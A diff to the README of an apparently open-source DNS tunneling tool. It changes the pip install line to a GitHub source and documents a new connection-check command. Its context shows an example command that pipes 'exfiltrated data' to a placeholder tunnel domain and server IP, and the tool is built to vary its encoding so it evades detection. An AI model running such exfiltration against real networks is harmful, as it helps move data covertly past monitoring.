@@ -13,10 +13,12 @@ Standard tools like [iodine](https://code.kryo.se/iodine/) and [dnscat2](https:/
 ## Install
 
 ```bash
-pip install mutant-dns
+pip install git+https://github.com/reypapin/mutant-dns.git
 ```
 
 Requires Python 3.8+ and Linux (TUN mode). Data mode works on any OS.
+
+This installs three commands: `mutant-dns-server`, `mutant-dns-client`, and `mutant-dns-check`.
 
 ---
 
@@ -39,6 +41,11 @@ echo "exfiltrated data" | mutant-dns-client --domain tunnel.example.com --server
 ```
 
 Decoded data appears on the server's stdout.
+
+**Before sending data, verify the connection works:**
+```bash
+mutant-dns-check --domain tunnel.example.com --server SERVER_IP
+```
 
 ---
 
@@ -91,6 +98,26 @@ With defaults, each packet uses a different encoding and a different chunk size,
 ---
 
 ## Reference
+
+### mutant-dns-check
+
+```
+usage: mutant-dns-check --domain DOMAIN --server IP [options]
+
+required:
+  --domain DOMAIN     Tunnel base domain (must match the server)
+  --server IP         mutant-dns-server IP address
+
+  --port PORT         DNS server port [default: 53]
+```
+
+Runs 6 checks and reports pass/fail with actionable suggestions:
+- UDP reachable — basic connectivity + RTT
+- Server identity — confirms a mutant-dns-server is listening
+- Domain accepted — server handles the specified domain
+- Encoding hex / base32 / base64 — real tunnel packets, end-to-end
+
+---
 
 ### mutant-dns-server
 
